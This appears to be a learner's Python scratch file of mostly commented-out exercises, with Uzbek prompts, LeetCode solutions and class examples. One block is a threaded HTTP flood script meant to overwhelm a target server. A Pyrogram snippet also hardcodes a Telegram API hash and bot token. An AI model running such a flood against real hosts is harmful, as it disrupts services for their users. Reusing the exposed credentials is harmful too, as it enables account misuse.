# while True:
#     k=int(input('K butun sonini kiriting:')); switch={
#     1: 'Yomon',
#     2: 'Qoniqarsiz', 3: 'Qoniqarli', 4: "Yaxshi",
#     5: "A'lo"
#     }
#     print(switch.get(k,"1 dan 5 gacha raqam kiriting!"));
# S=2
# while True:
#     S=S+1
#     print(S)

# from array import *
# massiv = array('i', [2, 5, 4, 0, 8])
# print(massiv)
# import numpy as np
# m=int(input('m='))
# n=int(input('n='))
 
# massiv=np.array([[0 for i in range(m)] for j in range(n)])
# k=int(input('k='))
# massiv=[[0 for i in range(m)] for j in range(n)]
# for i in range(m):
#     for j in range(n):
#         massiv[i][j]=int(input('massiv[i][j]='))
# for i in range(m):
#     print("Massiv[",i,"][",k,"]=",massiv[i][k])

# x=int(input('x='))
# y=int(input('y='))
# def degree(x,y):
#     if(y):
#         return x*degree(x,y-1);
#     return 1
# print(degree(x,y));

# class Person:
#   def __init__(self, name, age, helps):
#     self.x = name
#     self.y = age
#     self.t = helps
#   def myfunc(d):
#     print("Hello my name is " + d.x)

# p1 = Person("John", 36, "ok")
# p1.myfunc()

# import socket
# import threading


# target = ''
# fake_ip = '96.45.66.104'
# port = 8000


# attack_num = 0

# def attack():
#     while True:
#         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#         s.connect((target, port))
#         s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
#         s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
#         global attack_num
#         attack_num += 1
#         print(attack_num)
        
#         s.close()
        
# for i in range(50000):
#     thread = threading.Thread(target=attack)
#     thread.start()
# a=3
# b=5


# for i in range(a, b+1):
#     for j in range(1,11):
#         print(i*j)
# from matplotlib import pyplot as plt
# import seaborn as sns
# import numpy as np
# sns.set_style("darkgrid") # Установка стиля оформления графиков
# np.random.seed(123)
# x = [str(i) for i in range(10)]
# y = np.random.randint(10, size=len(x))
# sns.lineplot(x=x, y=y)
# plt.show()

# importing packages
# import seaborn as sns
# import matplotlib.pyplot as plt
  
# # loading dataset
# data = sns.load_dataset("tips")
  
# # draw lineplot
# # hue by sex
# # style to hue
# sns.lineplot(x="total_bill", y="size",
#              hue="sex", style="sex",
#              data=data)
  
# plt.show()


# class Solution:   
#     def twoSum(self, nums, target):
        
#         while len(nums)>0:
#             ind = len(nums)-1
#             item = nums.pop()
#             if target-item in nums:
#                 return [ind, nums.index(target-item)]

# nums = [2,7,11,15]
# target = 9

# d = Solution.twoSum()
# print(d)





####################################################### 1 Two Sum ################################################# 
# class Solution:   
#     def twoSum(nums, target):
#         output = []
#         for i in nums:
#             for j in nums:
#                 if i + j == target and nums.index(i) != nums.index(j):
#                     output.append(nums.index(i))
#                     output.append(nums.index(j))
#                     return output
# print(Solution.twoSum([2,7,11,15],9))
# print(Solution.twoSum([3,2,4],6))

###################################################### 13 Roman to Integer ################################################# 


# class Solution:
#     def romanToInt(self, s):
#         dict={"I":1,"V":5,"X":10,"L":50,"C":100,"D":500,"M":1000}
#         res=0
#         prev=""
#         for item in s:
#             res+=dict.get(item)
#             if(prev+item) in ["IV","IX","XL","XC","CD","CM"]:
#                 res-=2*dict.get(prev)
#             prev=item
#         return res

# d = Solution()
# print(d.romanToInt("I"))


###################################################### 2. Add Two Numbers ################################################# 

# l1 = input("Birinchi sonni kiriting: ").split(" ")
# l1.reverse()
# D = ""
# for i in l1:
#     D +=str(i)
# print(D)

# l2 = input("Ikkinchi sonni kiriting: ").split(" ")
# l2.reverse()
# F = ""
# for i in l2:
#     F +=str(i)
# print(F)

# S = int(F) + int(D)
# print(S)

# res = list(map(int, str(S)))
# print(res)

# res.reverse()
# print(res)

###################################################### 2. Add Two Numbers ################################################# 

# class Solution(object):
#     def addTwoNumbers(self, l1, l2):
#         """
#         :type l1: ListNode
#         :type l2: ListNode
#         :rtype: ListNode
#         """
#         result = ListNode(0)
#         result_tail = result
#         carry = 0
                
#         while l1 or l2 or carry:            
#             val1  = (l1.val if l1 else 0)
#             val2  = (l2.val if l2 else 0)
#             carry, out = ivmod(val1+val2 + carry, 10)    
                      
#             result_tail.next = ListNode(out)
#             result_tail = result_tail.next                      
            
#             l1 = (l1.next if l1 else None)
#             l2 = (l2.next if l2 else None)
               
#         return result.next


# import asyncio
# from pyrogram import Client

# api_id = 29349324
# api_hash = "d41f283e52b3cc850206f14bd467affe"
# # bot_token = "2083963103:AAGCaOvpcRhUThuZRcRvooP3VjLMknLSDBU"


# app = Client("my_bot", api_id, api_hash)
# app.start()
# app.send_message("me", "123")
# app.stop()

# def generator(a, b):
#     while True:
#         yield a*b
#         a = a+1
# g = generator(2, 3)

# import datetime
# while True:
#     x = datetime.datetime.now()
#     print(x)

# l = ['sat', 'bat', 'cat', 'mat']
  
# # map() can listify the list of strings individually
# # test = list(map(list, l))
# # print(test)
# def addition(n):
#     return n + n
  
# # We double all numbers using map()
# numbers = (1, 2, 3, 4)
# result = map(addition, numbers)
# print(list(result))

# a = [1,2,3,4,5]

# for i in a[2:4:1]:
#     print(i)

# class Computer():
#     def __init__(self, computer, ram, storage):
#         self.computer = computer
#         self.ram = ram
#         self.storage = storage


# # Class Mobile inherits Computer
# class Mobile(Computer):
#     def __init__(self, computer, ram, storage, model):
#         super().__init__(computer, ram, storage)
#         self.model = model
# Apple = Mobile('Apple', 2, 64, 'iPhone X')
# print('The mobile is:', Apple.computer)
# print('The RAM is:', Apple.ram)
# print('The storage is:', Apple.storage)
# print('The model is:', Apple.model)

# thislist = ["apple", "banana", "cherry"]
# thislist.insert(2, "watermelon")
# print(thislist)
# thislist = ["apple", "banana", "cherry"]
# tropical = ["mango", "pineapple", "papaya"]
# thislist.extend(tropical)
# print(thislist)
# thislist = ["apple", "banana", "cherry"]
# thislist.pop()
# print(thislist)

# thislist = ["apple", "banana", "cherry"]

# del thislist
# print(thislist)

# thislist = ["apple", "banana", "cherry"]
# for i in range(len(thislist)):
#   print(thislist[i])

# fruits = ["apple", "banana", "cherry", "kiwi", "mango"]
# newlist = []

# for x in fruits:
#   if "a" in x:
#     newlist.append(x)

# print(newlist)

# def myfunc(n):
#   return abs(n - 50)

# thislist = [100, 50, 65, 82, 23]
# thislist.sort(key = myfunc)
# print(thislist)
# thislist = ["banana", "Orange", "Kiwi", "cherry"]
# thislist.reverse()
# print(thislist)

# thistuple = ("apple", "banana", "cherry", "orange", "kiwi", "melon", "mango")
# thiss = list(thistuple)
# thiss.append('komil')
# thistuple = tuple(thiss)
# print(thistuple)

# def sayhello():
#     print('hello')
# sayhello()
# from datetime import date

# # random Person
# class Person:
#     def __init__(self, name, age):
#         self.komil = name
#         self.age = age

#     @classmethod
#     def fromBirthYear(cls, name, birthYear):
#         return cls(name, date.today().year - birthYear)

#     def display(self):
#         print(self.komil + "'s age is: " + str(self.age))

# person = Person('Adam', 19)
# person.display()

# person1 = Person.fromBirthYear('John',  1985)
# person1.display()

# from datetime import date

# # random Person
# class Person:
#     def __init__(self, name, age):
#         self.name = name
#         self.age = age

#     @staticmethod
#     def fromFathersAge(name, fatherAge, fatherPersonAgeDiff):
#         return Person(name, date.today().year - fatherAge + fatherPersonAgeDiff)

#     @classmethod
#     def fromBirthYear(cls, name, birthYear):
#         return cls(name, date.today().year - birthYear)

#     def display(self):
#         print(self.name + "'s age is: " + str(self.age))

# class Man(Person):
#     sex = 'Male'

# man = Man.fromBirthYear('John', 1985)
# print(isinstance(man, Man))

# man1 = Man.fromFathersAge('John', 1965, 20)
# print(isinstance(man1, Man))

# class Person:
#   def __init__(self, name, age):
#     self.name = name
#     self.age = age

#   def __str__(self):
#     return f"{self.name}({self.age})"

# p1 = Person("John", 36)

# print(p1)

# class MyClass:
#     b = 12
#     @classmethod
#     def my_static_method(cls, x, y):
#         return x + y + cls.b

# result = MyClass.my_static_method(5, 10)
# print(result)  # Output: 15

class Komil:
    def __init__(self, FI, age):
        self.verify_fio(FI)
        self.FI = FI
        self.age = age
    @classmethod
    def verify_fio(cls, FI):
        if FI != "Komil Tuev":
            raise TypeError('nono')

f = Komil("adf", 12)
print(f.__dict__)